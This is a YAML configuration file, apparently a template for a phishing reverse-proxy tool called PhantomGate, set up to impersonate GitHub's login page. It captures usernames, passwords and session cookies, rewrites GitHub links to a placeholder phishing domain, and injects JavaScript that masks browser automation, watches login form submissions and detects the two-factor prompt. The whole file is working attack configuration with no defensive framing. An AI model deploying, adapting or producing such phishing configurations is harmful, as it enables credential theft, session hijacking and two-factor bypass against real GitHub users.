name: GitHub
author: PhantomGate
version: 2.0.0
description: GitHub authentication - Pixel-perfect replica

auth:
  domains:
    - github.com
    - login.github.com
    - api.github.com
  
  login:
    domain: github.com
    path: /login
    username:
      selector: "input#login_field"
      capture: true
    password:
      selector: "input#password"
      capture: true
  
  tokens:
    cookies:
      - name: _gh_sess
        regex: ".*"
      - name: user_session
        regex: ".*"
      - name: logged_in
        regex: ".*"
      - name: _device_id
        regex: ".*"
      - name: gh_sess
        regex: ".*"

proxy:
  hosts:
    - domain: github.com
      inject: true
    - domain: login.github.com
      inject: true
  
  sub_filters:
    - domain: github.com
      search: "https://github.com"
      replace: "https://{phishing_domain}"

injection:
  js: |
    // PhantomGate Injection - GitHub
    (function() {
      'use strict';
      
      // Override navigator properties
      Object.defineProperty(navigator, 'webdriver', {get: () => false});
      
      // Capture form submissions
      document.addEventListener('submit', function(e) {
        var form = e.target;
        var username = form.querySelector('#login_field');
        var password = form.querySelector('#password');
        if (username && password) {
          console.log('[PhantomGate] GitHub credentials captured');
        }
      }, true);
      
      // Monitor for 2FA prompt
      var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          if (mutation.addedNodes.length) {
            var node = mutation.addedNodes[0];
            if (node.nodeType === 1) {
              var otp = node.querySelector('input[name="otp"]');
              if (otp) {
                console.log('[PhantomGate] 2FA prompt detected');
              }
            }
          }
        });
      });
      
      observer.observe(document.body, {childList: true, subtree: true});
    })();
